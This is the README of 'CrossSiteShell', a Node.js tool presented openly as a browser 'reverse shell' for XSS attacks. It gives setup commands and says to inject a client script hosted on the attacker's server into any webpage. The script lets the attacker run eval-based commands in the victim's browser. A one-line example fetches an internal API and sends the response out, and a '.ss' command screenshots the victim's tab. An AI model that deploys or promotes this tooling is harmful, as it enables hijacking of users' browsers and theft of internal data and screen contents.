# CrossSiteShell

A javascript/nodejs "reverse shell" that makes it easier to interact with the victim's browser during XSS attacks.

![demo gif](/img/demo.gif)

## Usage

Run the following commands to start up the server:
```
npm install
node server.js
```

Then import the script located at `http(s)://yourserver/client.js` in any webpage.

### Asynchronous data exfiltration
By default, the commands are executed through the eval function which is not asynchronous. To overcome this, I created a callback function (`window.oobsend(string)`) that sends data to the server asynchronously. Here's an example of how to use it to communicate with an internal API:

```js
fetch('https://internalservice/api').then(x => x.text().then(oobsend))
```

### Taking screenshots
By using the `.ss` command in the console, CrossSiteShell will attempt to take a screenshot of the victims tab. This is achieved by importing another library (html2canvas) that converts the HTML/CSS into a canvas and saves it's content as an image. The image should be saved to your disk after it gets received.

### HTTPS
HTTPS is not supported by default. I'd recommend using a reverse proxy such as nginx to redirect traffic to the script.